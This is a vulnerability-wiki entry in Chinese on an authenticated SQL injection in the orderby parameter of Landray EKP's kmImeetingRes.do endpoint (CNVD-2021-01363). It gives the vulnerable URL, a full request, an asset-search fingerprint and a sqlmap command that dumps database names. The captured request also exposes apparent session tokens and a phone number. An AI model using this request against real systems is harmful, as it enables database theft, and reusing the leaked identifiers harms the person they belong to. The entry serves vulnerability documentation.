---
source: "Threekiii/Vulnerability-Wiki"
title: "蓝凌EKP kmImeetingRes.do orderby后台SQL注入"
product: "蓝凌EKP"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CNVD-2021-01363"
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "仅产品无范围；另一同源篇给测试2021-03-24"
prerequisites: "有效后台会话，最低角色未明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
identifier_role: "primary"
source_url: "https://github.com/Threekiii/Vulnerability-Wiki"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E8%93%9D%E5%87%8COA/%E8%93%9D%E5%87%8COA-kmImeetingRes.do-%E5%90%8E%E5%8F%B0SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-CNVD-2021-01363.md"
id: "vw-da531c6dffdc08fcc507e591"
entity_id: "ve-da531c6dffdc08fcc507e591"
schema_version: "1"
---

# 蓝凌EKP kmImeetingRes.do orderby后台SQL注入

## 条目说明

- 对象与具体问题：蓝凌EKP；kmImeetingRes.do orderby后台SQL注入
- 版本、配置及部署条件：仅产品无范围；另一同源篇给测试2021-03-24
- 认证与权限前提：有效后台会话，最低角色未明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同CNVD01363文章同URL/正常请求/sqlmap验证，保留来源合并
- ordeby拼错应orderby；HTTP误标sql；无实际注入参数及返回文本
- 请求泄露手机号/会话Token/跟踪标识，未实际发送任何请求

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

深圳市蓝凌软件股份有限公司数字OA(EKP)存在SQL注入漏洞。攻击者可利用漏洞获取数据库敏感信息。

### 漏洞影响

```
蓝凌OA
```

### 网络测绘

```
app="Landray-OA系统"
```

### 漏洞复现

存在SQL注入的 Url为,这里拿官方的演示站点演示漏洞过程

```plain
https://xxx.xxx.xxx.xxx/km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true
```

其中存在SQL注入的参数为 **ordeby** ， 数据包如下

```http
GET /km/imeeting/km_imeeting_res/kmImeetingRes.do?contentType=json&method=listUse&orderby=1&ordertype=down&s_ajax=true HTTP/1.1
Host: xxx.xxx.xxx.xxx
Connection: close
Pragma: no-cache
Cache-Control: no-cache
sec-ch-ua: "Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"
sec-ch-ua-mobile: ?0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: UM_distinctid=1785f7392888e1-02ece8c7e9a996-5771031-1fa400-1785f73928943d; landray_danyuan=null; landray_guanjianci=null; landray_sorce=baidupinzhuanwy; landray_jihua=null; JSESSIONID=232B6933CF33B5422F9D2649739D48FE; Hm_lvt_223eecc93377a093d4111a2d7ea28f51=1616509114,1616566341,1616566350; Hm_lpvt_223eecc93377a093d4111a2d7ea28f51=1616566350; Hm_lvt_d14cb406f01f8101884d7cf81981d8bb=1616509114,1616566341,1616566350; Hm_lpvt_d14cb406f01f8101884d7cf81981d8bb=1616566507; Hm_lvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616509872,1616509969,1616509973,1616566507; Hm_lpvt_95f4f43e7aa1fe68a51c44ae4eed925d=1616566507; Hm_lvt_22f1fea4412727d23e6a998a4b46f2ab=1616509872,1616509969,1616509973,1616566507; Hm_lpvt_22f1fea4412727d23e6a998a4b46f2ab=1616566507; fd_name=%E5%95%8A%E7%9A%84%E5%93%88; fd_id=1785f817dd0f5a4beaa482646cb9a2d8; nc_phone=15572002383; j_lang=zh-CN; LtpaToken=AAECAzYwNUFEOEZBNjA1QjgxQkFsdW9stJ5e1pcW1hgQi3cOa0iEyAhdZZs=; Hm_lvt_95cec2a2f107db33ad817ed8e4a3073b=1616510026,1616566523; Hm_lpvt_95cec2a2f107db33ad817ed8e4a3073b=1616566523; add_customer=0
```

保存为文件，使用 Sqlmap 跑一下注入

```plain
sqlmap -r sql.txt -p orderby --dbs
```

![7028e5e6-5d0f-44f9-a3e0-044636024b0c](./.resource/蓝凌OA-kmImeetingRes.do-后台SQL注入漏洞-CNVD-2021-01363/media/202202090127479.png)


### 感谢名单

感谢 @Miaòa 师傅的投稿


---

> 来源：Threekiii/Vulnerability-Wiki（https://github.com/Threekiii/Vulnerability-Wiki）
